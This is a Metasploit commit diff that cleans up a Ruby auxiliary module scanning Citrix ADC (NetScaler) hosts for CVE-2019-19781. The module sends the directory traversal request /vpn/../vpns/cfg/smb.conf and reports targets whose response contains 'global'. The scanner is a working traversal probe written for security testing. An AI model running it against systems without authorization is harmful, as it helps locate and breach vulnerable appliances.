94b6b6d0821bad963bb33c26194e50be5c24b789
William Vu <William_Vu@rapid7.com>
2020-01-13 12:04:04 -0600

    Clean up module

--- modules/auxiliary/scanner/http/citrix_dir_traversal.rb
+++ modules/auxiliary/scanner/http/citrix_dir_traversal.rb
@@ -5,73 +5,70 @@
 
 class MetasploitModule < Msf::Auxiliary
 
-  # Exploit mixins should be called first
   include Msf::Exploit::Remote::HttpClient
-  include Msf::Auxiliary::WmapScanServer
-  # Scanner mixin should be near last
   include Msf::Auxiliary::Scanner
   include Msf::Auxiliary::Report
 
-  def initialize
-    super(
-      'Name'        => 'Citrix ADC Directory Traversal',
-      'Description' => 'This module exploits a directory traversal vulnerability (CVE-2019-19781) within Citrix ADC (NetScalers). It requests the smb.conf file located in the /vpns/cfg directory by issuing the request /vpn/../vpns/cfg/smb.conf. It then checks if the server is vulnerable by looking for the presense of a "global" variable in smb.conf, which this file should always contain.',
-      'Author' =>
-        [
-          'Erik Wynter',
-          'altonjx',
-        ],
-      'License' => MSF_LICENSE,
-      'DisclosureDate' => "Dec 17 2019",
-      'References' =>
-        [
-          ['CVE', '2019-19781'],
-          ['URL', 'https://nvd.nist.gov/vuln/detail/CVE-2019-19781/'],
-          ['URL', 'https://support.citrix.com/article/CTX267027/']
-        ]
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Citrix ADC (NetScaler) Directory Traversal Scanner',
+      'Description'    => %{
+        This module exploits a directory traversal vulnerability (CVE-2019-19781) within Citrix ADC
+        (NetScaler). It requests the smb.conf file located in the /vpns/cfg directory by issuing the request
+        /vpn/../vpns/cfg/smb.conf. It then checks if the server is vulnerable by looking for the presence of
+        a "global" variable in smb.conf, which this file should always contain.
+      },
+      'Author'         => [
+        'Erik Wynter',
+        'altonjx'
+      ],
+      'References'     => [
+        ['CVE', '2019-19781'],
+        ['URL', 'https://support.citrix.com/article/CTX267027/']
+      ],
+      'DisclosureDate' => '2019-12-17',
+      'License'        => MSF_LICENSE
+    ))
 
-    )
-
+    register_options([
+      OptString.new('TARGETURI', [true, 'Base path', '/'])
+    ])
   end
 
   def run_host(target_host)
+    turi = normalize_uri(target_uri.path, '/vpn/../vpns/cfg/smb.conf')
 
-    turl = normalize_uri('/vpn/../vpns/cfg/smb.conf')
+    res = send_request_raw(
+      'method' => 'GET',
+      'uri'    =>  turi
+    )
 
-    begin
-      res = send_request_raw({
-                               'uri' => turl,
-        'method'  => 'GET',
-        'version' => '1.0'
-                             }, 10)
+    unless res
+      print_error("#{full_uri(turi)} - No response, target seems down.")
 
-
-      if !res
-        print_error("#{target_host}#{turl} - No response, target seems down.")
-        return
-      end
-
-      rscode = res.code
-
-      if rscode != 200
-        print_status("HTTP response code: #{rscode}. The target is not vulnerable to CVE-2019-19781.")
-        vprint_status("Did not find #{target_host}#{turl}, hence the target is not vulnerable to CVE-2019-19781.")
-        return
-      end
-
-      print_status("Found #{target_host}#{turl}.")
-      print_good("The target is vulnerable to CVE-2019-19781.")
-
-      vprint_status("Obtained HTTP response code #{rscode} for #{target_host}#{turl}. This means that access to /vpns/cfg/smb.conf was obtained via directory traversal, hence #{target_host} is vulnerable to CVE-2019-19781.")
-      report_note(
-        host: target_host,
-        port: rport,
-        proto: 'tcp',
-        sname: (ssl ? 'https' : 'http'),
-        type: 'CVE_2019_19781_check'
-      )
-    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
-    rescue ::Timeout::Error, ::Errno::EPIPE
+      return Exploit::CheckCode::Unknown
     end
+
+    unless res.code == 200 && res.body.include?('global')
+      print_error("#{full_uri(turi)} - The target is not vulnerable to CVE-2019-19781.")
+      vprint_error("Obtained HTTP response code #{res.code} not including \"global\" for #{full_uri(turi)}.")
+
+      return Exploit::CheckCode::Safe
+    end
+
+    print_good("#{full_uri(turi)} - The target is vulnerable to CVE-2019-19781.")
+    msg = "Obtained HTTP response code #{res.code} including \"global\" for #{full_uri(turi)}. " \
+          'This means that access to /vpns/cfg/smb.conf was obtained via directory traversal.'
+    vprint_good(msg)
+
+    report_vuln(
+      host: target_host,
+      name: name,
+      refs: references,
+      info: msg
+    )
+
+    Exploit::CheckCode::Vulnerable
   end
+
 end
